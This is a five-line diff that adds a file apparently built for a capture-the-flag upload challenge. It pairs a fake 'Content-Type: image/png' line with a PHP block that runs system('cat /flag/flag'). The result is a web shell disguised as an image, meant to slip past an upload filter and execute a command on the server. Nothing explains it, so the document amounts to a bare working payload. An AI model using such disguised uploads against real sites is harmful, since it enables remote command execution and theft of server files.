@@ -1,0 +1,5 @@
+Content-Type: image/png
+<?php
+	system('cat /flag/flag');
+	
+?>
